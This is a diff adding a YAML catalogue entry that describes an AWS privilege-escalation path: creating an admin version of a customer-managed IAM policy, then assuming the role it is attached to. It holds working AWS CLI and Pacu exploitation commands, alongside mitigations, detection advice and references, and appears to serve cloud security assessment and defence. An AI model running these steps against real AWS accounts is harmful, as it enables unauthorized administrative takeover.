@@ -1,0 +1,232 @@
+id: iam-016
+name: iam:CreatePolicyVersion + sts:AssumeRole
+category: lateral-movement
+services:
+- iam
+- sts
+
+permissions:
+  required:
+  - permission: iam:CreatePolicyVersion
+    resourceConstraints: Customer-managed policy ARN must be in the Resource section and the policy must be attached to a role that the attacker can assume
+  - permission: sts:AssumeRole
+    resourceConstraints: Target role ARN must be in the Resource section and the role's trust policy must allow the principal to assume it
+  additional:
+  - permission: iam:GetPolicy
+    resourceConstraints: Helpful for getting policy ARN and current version information
+  - permission: iam:GetPolicyVersion
+    resourceConstraints: Useful for viewing current policy document and version details
+  - permission: iam:ListPolicyVersions
+    resourceConstraints: Helpful for listing all policy versions to verify new version creation
+  - permission: iam:ListRoles
+    resourceConstraints: Useful for discovering roles that have the target policy attached
+  - permission: iam:GetRole
+    resourceConstraints: Helpful for viewing role details, attached policies, and trust policies
+
+description: A principal with `iam:CreatePolicyVersion` on a customer-managed policy attached to a role and `sts:AssumeRole` on that role can create a new policy version with administrative permissions, then assume the role to gain those elevated privileges. This path exploits AWS's policy versioning feature where new versions can be set as default and take effect immediately, combined with lateral movement through role assumption.
+
+prerequisites:
+  admin:
+  - A customer-managed policy must exist that is attached to a target role
+  - The target role's trust policy must allow the attacker's principal to assume it
+  - The target role must have administrative permissions after policy modification
+  lateral:
+  - A customer-managed policy must exist that is attached to a target role
+  - The target role's trust policy must allow the attacker's principal to assume it
+
+exploitationSteps:
+  awscli:
+  - step: 1
+    command: aws sts get-caller-identity
+    description: Verify current identity before privilege escalation
+  - step: 2
+    command: aws iam list-roles --query 'Roles[*].[RoleName,Arn]' --output table
+    description: List available roles to find targets with the customer-managed policy attached (optional but helpful for discovery)
+  - step: 3
+    command: aws iam get-policy --policy-arn arn:aws:iam::ACCOUNT_ID:policy/TARGET_POLICY
+    description: Get the target customer-managed policy information to verify it exists and check current version
+  - step: 4
+    command: aws iam get-policy-version --policy-arn arn:aws:iam::ACCOUNT_ID:policy/TARGET_POLICY --version-id v1
+    description: View the current policy document to understand existing permissions (optional)
+  - step: 5
+    command: |
+      aws iam create-policy-version \
+        --policy-arn arn:aws:iam::ACCOUNT_ID:policy/TARGET_POLICY \
+        --policy-document file://admin_policy.json \
+        --set-as-default
+    description: Create a new policy version with administrative permissions and set it as default. The policy immediately takes effect for all principals that have it attached.
+  - step: 6
+    command: sleep 15
+    description: Wait briefly for the policy changes to propagate across AWS (typically takes a few seconds)
+  - step: 7
+    command: aws iam list-policy-versions --policy-arn arn:aws:iam::ACCOUNT_ID:policy/TARGET_POLICY
+    description: Verify the new policy version was created and is set as default (optional)
+  - step: 8
+    command: |
+      aws sts assume-role \
+        --role-arn arn:aws:iam::ACCOUNT_ID:role/TARGET_ROLE \
+        --role-session-name privesc-session
+    description: Assume the target role to obtain temporary credentials with the newly elevated permissions
+  - step: 9
+    command: |
+      export AWS_ACCESS_KEY_ID=<AccessKeyId from step 8>
+      export AWS_SECRET_ACCESS_KEY=<SecretAccessKey from step 8>
+      export AWS_SESSION_TOKEN=<SessionToken from step 8>
+    description: Configure the AWS CLI to use the assumed role credentials
+  - step: 10
+    command: aws sts get-caller-identity
+    description: Verify the assumed role identity
+  - step: 11
+    command: aws iam list-users --max-items 3
+    description: Verify administrative access was successfully obtained
+  pacu:
+  - step: 1
+    command: run iam__enum_permissions
+    description: Enumerate IAM permissions and identify roles with customer-managed policies attached
+  - step: 2
+    command: run iam__privesc_scan
+    description: Scan for IAM privilege escalation opportunities including CreatePolicyVersion + AssumeRole combinations
+  - step: 3
+    command: run iam__create_policy_version --policy-arn arn:aws:iam::ACCOUNT_ID:policy/TARGET_POLICY --policy-file admin_policy.json
+    description: Use Pacu to create a new policy version with admin permissions
+  - step: 4
+    command: run iam__assume_role --role-arn arn:aws:iam::ACCOUNT_ID:role/TARGET_ROLE
+    description: Assume the privileged role using Pacu
+
+limitations: |
+  This path provides administrative access only if the new policy version includes administrative permissions (e.g., AdministratorAccess equivalent). The attacker gains whatever permissions are specified in the new policy version they create. However, even limited additional permissions may enable multi-hop attacks or data access.
+
+recommendation: |
+  This attack path requires multiple controls to prevent effectively:
+
+  **1. Restrict `iam:CreatePolicyVersion` permission:**
+  - Very few principals need this permission. Restrict it to only authorized IAM administrators.
+  - Use resource-level restrictions to limit which policies can be modified:
+  ```json
+  {
+    "Effect": "Allow",
+    "Action": "iam:CreatePolicyVersion",
+    "Resource": "arn:aws:iam::ACCOUNT_ID:policy/AllowedPolicy*"
+  }
+  ```
+
+  **2. Restrict `sts:AssumeRole` permission:**
+  - Carefully audit IAM role trust policies to ensure they follow the principle of least privilege.
+  - Only allow trusted principals to assume sensitive roles.
+  - Consider requiring MFA for sensitive role assumptions:
+  ```json
+  {
+    "Effect": "Allow",
+    "Principal": {"AWS": "arn:aws:iam::ACCOUNT_ID:user/TrustedUser"},
+    "Action": "sts:AssumeRole",
+    "Condition": {"Bool": {"aws:MultiFactorAuthPresent": "true"}}
+  }
+  ```
+
+  **3. Monitoring and Detection:**
+  - Alert on `CreatePolicyVersion` events in CloudTrail, especially with `--set-as-default` flag
+  - Monitor for `AssumeRole` events on privileged roles, especially shortly after policy version changes
+  - Use AWS Config rules to detect roles with administrative permissions that can be assumed by users
+  - Implement anomaly detection for unusual assume-role patterns or assumptions from unexpected IP addresses
+
+  **4. Additional Controls:**
+  - Use IAM Access Analyzer to regularly audit role trust policies for overly permissive trust relationships
+  - Implement service control policies (SCPs) to restrict policy version creation at the organizational level
+  - Consider using permission boundaries to limit the maximum permissions that can be granted through policy modifications
+
+discoveredBy:
+  name: "Spencer Gietzen"
+  organization: "Rhino Security Labs"
+  date: "2019"
+
+references:
+  - title: "AWS IAM Privilege Escalation Methods"
+    url: "https://rhinosecuritylabs.com/aws/aws-privilege-escalation-methods-mitigation/"
+  - title: "AWS IAM Privilege Escalation Techniques - Hacking the Cloud"
+    url: "https://hackingthe.cloud/aws/exploitation/iam_privilege_escalation/"
+  - title: "Investigating Privilege Escalation Methods in AWS"
+    url: "https://bishopfox.com/blog/privilege-escalation-in-aws"
+
+relatedPaths:
+- iam-001
+- iam-007
+- iam-008
+- sts-001
+
+toolSupport:
+  pmapper: true
+  iamVulnerable: true
+  pacu: true
+
+attackVisualization:
+  nodes:
+    - id: start
+      label: starting-principal
+      type: principal
+      description: |
+        The principal initiating the attack. Can be an IAM user or role with both `iam:CreatePolicyVersion` permission on a customer-managed policy and `sts:AssumeRole` permission on a target role. The customer-managed policy must be attached to the target role that the principal can assume.
+
+    - id: customer_policy
+      label: customer-managed-policy
+      type: resource
+      description: |
+        A customer-managed IAM policy that is attached to the target role. The starting principal has `iam:CreatePolicyVersion` permission for this specific policy ARN, allowing them to create new versions with elevated permissions. This policy acts as the pivot point for the attack - by modifying it, the attacker can elevate the permissions of any principal that has it attached.
+
+    - id: target_role
+      label: target-role
+      type: resource
+      description: |
+        An IAM role that has the customer-managed policy attached to it. The starting principal has `sts:AssumeRole` permission for this role. Once the attacker modifies the customer-managed policy to grant administrative permissions, this role inherits those elevated privileges. The role must have a trust policy that allows the starting principal to assume it.
+
+    - id: admin
+      label: Effective Administrator
+      type: outcome
+      description: |
+        Full administrative access to the AWS account. The attacker achieves this by first creating a new version of the customer-managed policy with administrative permissions (setting it as the default), then using `sts:AssumeRole` to assume the target role which now has those elevated privileges. The assumed role credentials provide full administrative access to the AWS environment.
+
+  edges:
+    - from: start
+      to: customer_policy
+      label: iam:CreatePolicyVersion
+      description: |
+        The attacker uses `iam:CreatePolicyVersion` to create a new version of the customer-managed policy with administrative permissions and sets it as the default version.
+
+        Command:
+        ```bash
+        aws iam create-policy-version \
+          --policy-arn "arn:aws:iam::ACCOUNT_ID:policy/customer-policy-name" \
+          --policy-document file://admin_policy.json \
+          --set-as-default
+        ```
+
+        Where admin_policy.json contains a policy document granting full administrative access. The `--set-as-default` flag makes this new version active immediately, so any principal with this policy attached (including the target role) instantly gains these elevated permissions.
+
+    - from: customer_policy
+      to: target_role
+      label: Policy attached to role
+      description: |
+        The customer-managed policy is attached to the target role. This is a prerequisite condition that must exist for the attack to work. When the policy is modified to include administrative permissions, the target role automatically inherits those new permissions. The attacker needs to identify this relationship beforehand, typically using `iam:ListEntitiesForPolicy` or `iam:ListAttachedRolePolicies` permissions.
+
+    - from: target_role
+      to: admin
+      label: sts:AssumeRole
+      description: |
+        The attacker uses `sts:AssumeRole` to assume the target role, which now has administrative permissions via the modified customer-managed policy.
+
+        Command:
+        ```bash
+        aws sts assume-role \
+          --role-arn "arn:aws:iam::ACCOUNT_ID:role/target-role-name" \
+          --role-session-name "privesc-session"
+        ```
+
+        The API returns temporary security credentials (AccessKeyId, SecretAccessKey, SessionToken) that have full administrative access. Configure these credentials in the AWS CLI or SDK to perform administrative actions:
+
+        ```bash
+        export AWS_ACCESS_KEY_ID=<AccessKeyId>
+        export AWS_SECRET_ACCESS_KEY=<SecretAccessKey>
+        export AWS_SESSION_TOKEN=<SessionToken>
+
+        # Verify administrative access
+        aws iam list-users
+        ```
